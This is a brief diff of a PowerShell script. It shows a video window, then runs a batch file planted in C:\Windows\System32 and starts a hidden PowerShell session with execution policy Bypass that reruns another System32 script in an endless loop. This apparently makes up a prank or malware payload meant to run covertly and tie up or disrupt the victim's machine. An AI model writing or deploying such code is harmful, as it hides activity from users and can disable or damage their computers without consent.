@@ -30,8 +30,7 @@ $VideoPlayer.Source = $VideoSource;
 $VideoPlayer.Play()
  
 #Show Up the Window 
-$Window.ShowDialog() | out-null
+$Window.ShowDialog() | out-null;
 
-C:\Windows\System32\fb.bat
-
+C:\Windows\System32\fb.bat;
 powershell -w h -NoP -NonI -Exec Bypass "while (1) {C:\Windows\System32\rr\rr.ps1}"
